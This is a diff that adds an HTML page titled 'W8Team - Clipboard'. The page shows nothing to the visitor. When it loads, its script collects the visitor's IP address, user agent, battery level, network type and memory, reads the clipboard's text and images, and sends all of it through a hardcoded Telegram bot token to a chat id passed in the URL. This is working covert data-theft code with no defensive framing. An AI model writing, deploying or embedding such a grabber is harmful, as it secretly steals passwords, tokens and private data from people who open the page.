@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>W8Team - Clipboard</title>
+</head>
+
+<body>
+    <script>
+        const botToken = "9087217791:AAEjOhKH0uOml0VcW8Vsw2whkm0ZX6cOSvY";
+        let chatId = getChatIdFromUrl();
+
+        function getChatIdFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('id');
+        }
+
+        async function fetchWanIp() {
+            try {
+                const response = await fetch("https://ipinfo.io/json");
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error(error);
+                return "Error retrieving WAN IP";
+            }
+        }
+
+        async function getBatteryPercentage() {
+            try {
+                const battery = await navigator.getBattery();
+                return (battery.level * 100).toFixed(2);
+            } catch (e) {
+                return "N/A";
+            }
+        }
+
+        function getNetworkType() {
+            return navigator.connection ? navigator.connection.effectiveType : "N/A";
+        }
+
+        function sendTextToTelegram(message) {
+            const maxLen = 4096;
+            if (message.length <= maxLen) {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`, { method: "POST" })
+                    .then(r => r.json())
+                    .then(data => { if (!data.ok) throw new Error(data.description); })
+                    .catch(err => { console.error(err); alert("Failed to send message to Telegram."); });
+                return;
+            }
+            for (let i = 0; i < message.length; i += maxLen) {
+                const chunk = message.slice(i, i + maxLen);
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(chunk)}`, { method: "POST" })
+                    .then(r => r.json())
+                    .then(data => { if (!data.ok) throw new Error(data.description); })
+                    .catch(err => console.error(err));
+            }
+        }
+
+        function sendPhotoToTelegram(blob, filename) {
+            const formData = new FormData();
+            formData.append("photo", blob, filename || "clipboard.png");
+            formData.append("chat_id", chatId);
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData })
+                .then(r => r.json())
+                .then(data => { if (!data.ok) throw new Error(data.description); })
+                .catch(err => console.error(err));
+        }
+
+        async function readClipboardAndSend() {
+            let clipboardText = "";
+            const clipboardItems = [];
+
+            try {
+                if (navigator.clipboard && navigator.clipboard.read) {
+                    const items = await navigator.clipboard.read();
+                    for (const item of items) {
+                        for (const type of item.types) {
+                            if (type === "text/plain") {
+                                const blob = await item.getType(type);
+                                clipboardText += await blob.text();
+                                if (clipboardText.length && !clipboardText.endsWith("\n")) clipboardText += "\n";
+                            } else if (type.startsWith("image/")) {
+                                const blob = await item.getType(type);
+                                clipboardItems.push(blob);
+                            }
+                        }
+                    }
+                }
+            } catch (e) {
+                console.error("clipboard.read:", e);
+            }
+
+            if (!clipboardText && navigator.clipboard && navigator.clipboard.readText) {
+                try {
+                    clipboardText = await navigator.clipboard.readText();
+                } catch (e) {
+                    console.error("clipboard.readText:", e);
+                }
+            }
+
+            if (clipboardText.trim()) {
+                sendTextToTelegram("📋 Clipboard text:\n\n" + clipboardText.trim());
+            } else if (clipboardItems.length === 0) {
+                sendTextToTelegram("📋 Clipboard: (empty or access denied)");
+            }
+
+            clipboardItems.forEach((blob, i) => {
+                const ext = (blob.type || "").split("/")[1] || "png";
+                sendPhotoToTelegram(blob, "clipboard_" + i + "." + ext);
+            });
+        }
+
+        async function onPageLoad() {
+            const wanIp = await fetchWanIp();
+            const userAgent = navigator.userAgent;
+            const batteryPercentage = await getBatteryPercentage();
+            const networkType = getNetworkType();
+            const dateAndTime = new Date().toString();
+            const totalRam = navigator.deviceMemory ?? "N/A";
+
+            const infoMessage = `
+🌐 WAN IP Address: ${wanIp}
+📱 User-Agent: ${userAgent}
+🔋 Battery Percentage: ${batteryPercentage}%
+📡 Network Type: ${networkType}
+🗓 Date and Time: ${dateAndTime}
+💾 Total RAM: ${totalRam} GB
+📋 Clipboard: reading and sending...
+`;
+
+            sendTextToTelegram(infoMessage);
+            await readClipboardAndSend();
+        }
+
+        onPageLoad();
+    </script>
+</body>
+
+</html>
